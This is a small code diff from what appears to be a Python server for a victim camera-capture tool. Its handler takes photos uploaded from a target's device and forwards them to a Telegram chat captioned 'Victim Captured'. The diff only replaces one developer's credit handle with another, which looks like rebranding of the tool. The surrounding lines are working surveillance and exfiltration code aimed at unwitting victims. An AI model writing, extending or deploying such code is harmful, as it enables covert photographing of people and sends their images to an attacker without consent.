@@ -68,11 +68,11 @@ async def submit_photo(request):
         if chat_id and photo_field:
             photo_bytes = photo_field.file.read()
             input_file = types.BufferedInputFile(photo_bytes, filename=f"capture_{mode}.jpg")
-            # Occurrence 1 of Developed by: @LoserNagiOfficial
+            # Occurrence 1 of Developed by: @Rytce
             await bot.send_photo(
                 chat_id, 
                 input_file, 
-                caption=f"{Emojis.CAMERA} <b>Victim Captured ({mode})</b>\n{Emojis.LIGHTNING} Developed by: @LoserNagiOfficial",
+                caption=f"{Emojis.CAMERA} <b>Victim Captured ({mode})</b>\n{Emojis.LIGHTNING} Developed by: @Rytce",
                 parse_mode='HTML'
             )
             return web.json_response({"status": "ok"})
